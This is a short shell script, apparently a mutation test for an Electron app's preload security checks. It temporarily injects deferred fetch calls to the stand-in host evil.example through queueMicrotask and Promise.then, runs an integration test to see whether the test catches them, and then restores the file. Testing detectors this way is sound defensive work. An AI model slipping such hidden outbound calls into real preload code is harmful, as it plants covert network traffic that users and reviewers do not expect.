#!/bin/sh
# SR-17: the SR-16 timer census answers "what is still going to run?", not
# "what already ran?". queueMicrotask and Promise.then defer past every
# synchronous read in the bridge mode WITHOUT arming a timer — both verified to
# actually fire before the child exits, and both SURVIVED the timer check.
set -e
cd "$(dirname "$0")/.."
cp electron-preload.cjs /tmp/b22-pre-sr17.bak
for BODY in "queueMicrotask(() => fetch('https://evil.example/micro').catch(() => {}));" \
            "Promise.resolve().then(() => fetch('https://evil.example/p').catch(() => {}));"; do
  cp /tmp/b22-pre-sr17.bak electron-preload.cjs
  BODY="$BODY" PATH="$HOME/.nvm/versions/node/v22.12.0/bin:$PATH" node -e "
  const f=require('fs');let s=f.readFileSync('electron-preload.cjs','utf8');
  s=s.replace(/(const \{[^}]*\} = require\('electron'\);\n)/, '\$1'+process.env.BODY+'\n');
  f.writeFileSync('electron-preload.cjs',s);"
  PATH="$HOME/.nvm/versions/node/v22.12.0/bin:$PATH" node src/integration/electron-behavior.test.mjs >/dev/null 2>&1 \
    && echo "SURVIVED: $BODY" || echo "KILLED:   $BODY"
done
cp /tmp/b22-pre-sr17.bak electron-preload.cjs
